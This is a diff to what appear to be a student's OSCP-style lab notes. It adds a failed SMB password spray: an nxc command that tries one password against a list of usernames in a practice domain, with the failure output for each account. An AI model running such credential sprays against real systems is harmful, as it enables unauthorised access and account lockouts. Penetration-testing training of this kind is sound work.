@@ -44,8 +44,38 @@ mimikatz #
 
 ---
 
-# Admin Password spray
+# Admin Password spray -> 失敗
 
 ```sh
+┌──(koshi㉿kali)-[~/Exam/AD/AD_Common]
+└─$ nxc smb $TargetIP -u usernames.txt -p CarHammerChip964 --continue-on-success
+SMB         172.16.104.202  445    SRV22            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SRV22) (domain:oscp.exam) (signing:False) (SMBv1:False)
+SMB         172.16.104.202  445    SRV22            [-] oscp.exam\C.ROGERS@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
+SMB         172.16.104.202  445    SRV22            [-] oscp.exam\ADMINISTRATOR@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
+SMB         172.16.104.202  445    SRV22            [-] oscp.exam\U.GREGORY@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
+SMB         172.16.104.202  445    SRV22            [-] oscp.exam\C.DEAN@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
+SMB         172.16.104.202  445    SRV22            [-] oscp.exam\O.HUGHES@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
+SMB         172.16.104.202  445    SRV22            [-] oscp.exam\P.GETHIN@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
+SMB         172.16.104.202  445    SRV22            [-] oscp.exam\T.FUCHS@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
+SMB         172.16.104.202  445    SRV22            [-] oscp.exam\B.WILLIAMS@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
+SMB         172.16.104.202  445    SRV22            [-] oscp.exam\V.SKINNER@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
+SMB         172.16.104.202  445    SRV22            [-] oscp.exam\G.JARVIS@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
+SMB         172.16.104.202  445    SRV22            [-] oscp.exam\M.NEWMAN@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
+SMB         172.16.104.202  445    SRV22            [-] oscp.exam\J.KOLE@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
+SMB         172.16.104.202  445    SRV22            [-] oscp.exam\S.TUCKER@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
+SMB         172.16.104.202  445    SRV22            [-] oscp.exam\L.EVGENY@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
+SMB         172.16.104.202  445    SRV22            [-] oscp.exam\R.ANDREWS@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
+SMB         172.16.104.202  445    SRV22            [-] oscp.exam\R.GALLAGHER@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
+SMB         172.16.104.202  445    SRV22            [-] oscp.exam\S.FISCHER@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
+SMB         172.16.104.202  445    SRV22            [-] oscp.exam\K.FREEMAN@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
+SMB         172.16.104.202  445    SRV22            [-] oscp.exam\B.CROSS@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
+SMB         172.16.104.202  445    SRV22            [-] oscp.exam\E.DDWARDS@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
+SMB         172.16.104.202  445    SRV22            [-] oscp.exam\D.HALL@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
+SMB         172.16.104.202  445    SRV22            [-] oscp.exam\F.HATFIELD@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
+SMB         172.16.104.202  445    SRV22            [-] oscp.exam\B.MARTIN@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
+SMB         172.16.104.202  445    SRV22            [-] oscp.exam\V.PERRY@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
+SMB         172.16.104.202  445    SRV22            [-] oscp.exam\A.BAILEY@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
+SMB         172.16.104.202  445    SRV22            [-] oscp.exam\W.BYRD@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
+SMB         172.16.104.202  445    SRV22            [-] oscp.exam\IUSR@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
 
 ```
